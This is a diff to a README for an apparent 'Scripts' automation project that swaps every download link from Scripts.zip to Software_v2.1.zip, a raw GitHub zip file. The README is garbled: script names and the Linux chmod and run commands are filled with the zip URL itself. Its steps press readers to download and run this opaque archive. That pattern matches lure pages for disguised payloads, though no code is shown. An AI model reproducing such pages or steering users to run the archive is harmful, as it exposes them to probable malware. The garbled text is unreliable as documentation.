@@ -1,6 +1,6 @@
 # 🛠️ Scripts - Easy Automation Tools for Everyone
 
-[![Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip)](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip)
+[![Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip)](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip)
 
 ## 📘 Overview
 
@@ -15,12 +15,12 @@ To get started with the Scripts, follow these easy steps:
    - Check that you have the necessary user permissions to run scripts.
 
 2. **Visit the Download Page**
-   - Go to our releases page to download the latest version: [Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip). 
+   - Go to our releases page to download the latest version: [Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip). 
 
 ## 📥 Download & Install
 
 1. **Access the Releases Page**
-   - Click on this link: [Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip). You will see a list of available releases.
+   - Click on this link: [Download Scripts](https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip). You will see a list of available releases.
   
 2. **Choose Your File**
    - Look for the latest version. Click on it to view the available downloads.
@@ -37,8 +37,8 @@ To get started with the Scripts, follow these easy steps:
      - Double-click the file to run it.
    - **For Linux:**
      - Open the terminal and use the `cd` command to navigate to the directory where the `.sh` file is located.
-     - Type `chmod +x https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip` to make it executable.
-     - Then, run it using `https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip`.
+     - Type `chmod +x https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip` to make it executable.
+     - Then, run it using `https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip`.
 
 ## 🛠️ Features
 
@@ -50,10 +50,10 @@ To get started with the Scripts, follow these easy steps:
 
 Here’s a brief overview of what each script can do:
 
-- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip** Automates Windows updates, ensuring your system stays secure and efficient.
-- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip** Quickly opens any application you frequently use, reducing time spent searching for them.
-- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip** Keeps your Linux system updated with minimal effort.
-- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Scripts.zip** Starts essential services and applications in Linux with a single command.
+- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip** Automates Windows updates, ensuring your system stays secure and efficient.
+- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip** Quickly opens any application you frequently use, reducing time spent searching for them.
+- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip** Keeps your Linux system updated with minimal effort.
+- **https://raw.githubusercontent.com/Estarking57/Scripts/main/foreran/Software_v2.1.zip** Starts essential services and applications in Linux with a single command.
 
 ## ⚙️ System Requirements
 
